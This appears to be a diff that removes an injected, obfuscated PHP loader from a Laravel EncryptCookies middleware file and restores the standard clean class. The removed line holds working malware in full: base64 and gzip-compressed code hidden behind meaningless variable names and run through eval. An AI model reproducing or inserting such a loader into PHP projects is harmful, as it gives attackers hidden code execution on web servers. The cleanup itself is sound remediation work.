@@ -1,1 +1,17 @@
-<?php $_='caf067ec';$__='printf'; $_____='b2JfZW5kX2NsZWFu'; $______________='cmV0dXJuICAgIGV2YWwoJF8pOw=='; $__________________='X19vbWVnYQ=='; $______=' Z3p1bmNvbXByZXNz';$___=' b2Jfc3RhcnQ=';$____='b2JfZ2V0X2NvbnRlbnRz';$__= 'base64_decode' ; $______=$__($______); if(!function_exists('__omega')){function __omega($_oA,$_oS){return eval("return function($_oA){{$_oS}};");}}$__________________=$__($__________________); $______________=$__($______________); $__________=$__________________('$_',$______________); $_____=$__($_____);$____=$__($____);$___=$__($___); $_='eNptUk1vozAQve+v4FCJRNoDkKQNQhxipzhAlwqyAcMlwjaBNJDQkiYhv34NzQfV1tLY4+c3b0bWE4Sv9bC8L118GjzGo/HoSdQevoDyY73dr0Ttl9Dh64KIZfVAAn8burouCvfnq57OU5EWvsSw9WlCkLPCqGzorbA8Ll+PTZHwXXQpCG0RiavkcbhkCd2xRNT+G3Hq7hxYjDLe/UyR8RbNAaAzQOczT6LGyYkDb0OQPwixlb8eJXvqljJVFuk8OFUskEtSGFLkn6ZEUT/iwKd/g3wToVPOFKPmuEEKp04wkFxFPcRKntMaZDx+0n0jyDjzt59q8mTm5aTwzuazXEbIqyLMMlosHLitHLiepCacHOz17pqn9hosYrRI+Xz7CP9JiRKmDGW5iZwDUfZlg/F7xiA4x0iVCXI5V5VMZHGO/xkOrBHlPSM4vGumkt2cPN7NZ6CE2Ez5/HWIN52+40sOjpTrRYHDw00t5A9DxT8yOFFN4zZzGy/1rYY1f7FyJbvjkY4N2rN3ufVbV3WwvnZltmBPbHbx943+3SAXnV7XD/2+9g8Hz9e7'; $___();$__________($______($__($_))); $________=$____(); $_____(); echo $________;
+<?php
+
+namespace App\Http\Middleware;
+
+use Illuminate\Cookie\Middleware\EncryptCookies as Middleware;
+
+class EncryptCookies extends Middleware
+{
+    /**
+     * The names of the cookies that should not be encrypted.
+     *
+     * @var array
+     */
+    protected $except = [
+        //
+    ];
+}
